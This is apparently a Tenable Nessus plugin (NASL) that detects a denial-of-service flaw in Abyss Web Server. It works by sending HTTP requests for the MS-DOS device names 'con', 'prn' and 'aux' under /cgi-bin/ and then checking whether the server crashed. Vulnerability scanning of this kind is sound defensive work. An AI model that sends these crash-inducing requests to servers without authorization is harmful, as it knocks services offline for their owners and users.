#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(15563);
 script_version("$Revision: 1.15 $");

 script_osvdb_id(11006);
 script_xref(name:"Secunia", value:"12900");

 script_name(english:"Abyss Web Server MS-DOS Device Name DoS");
 script_summary(english:"Try to pass an MS-DOS device name to crash the remote web server");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an MS-DOS device
name in an HTTP request.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/vulnwatch/2004/q4/13");
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.2.3.0 or higher.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/10/20");
 script_cvs_date("$Date: 2017/02/21 14:37:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2017 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("global_settings.inc");
include("http_func.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0, "TCP port "+port+" is closed.");

if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if ( ! banner)
     exit(1, "No web banner on port "+port+".");
  if ("Abyss/" >!< banner )
    exit(0, "The web server on port "+port+" is not Abyss.");
}
if (http_is_dead(port:port))
  exit(1, "The web server on port "+port+" is already dead.");

function check(pt,dev)
{
  local_var r, req, soc;
  req = string("GET /cgi-bin/",dev," HTTP/1.0\r\n\r\n");
  soc = http_open_socket(pt);
  if(! soc) exit(1, "TCP connection failed to port "+port+".");

  send(socket:soc, data: req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port: pt)) { security_hole(pt); exit(0);}
}

dev_name=make_list("con","prn","aux");
foreach devname (dev_name)
{
  check(pt:port, dev:devname);
}
exit(0, "The web server on port "+port+" is not vulnerable.");
